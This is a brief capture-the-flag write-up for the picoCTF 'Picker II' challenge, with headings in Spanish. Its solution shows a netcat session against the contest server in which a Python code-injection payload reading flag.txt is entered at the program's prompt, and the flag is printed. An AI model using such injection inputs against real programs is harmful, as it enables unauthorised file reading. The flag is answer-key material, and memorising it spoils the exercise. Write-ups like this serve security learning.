### DESCRIPCIÓN

Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 62223`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/522/picker-II.py).
### SOLUCIÓN

```
┌──(kali㉿kali)-[~/Desktop/Reversing]
└─$ nc saturn.picoctf.net 62223
==> print(open('flag.txt').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
'NoneType' object is not callable

```
### NOTAS ADICIONALES


### REFERENCIAS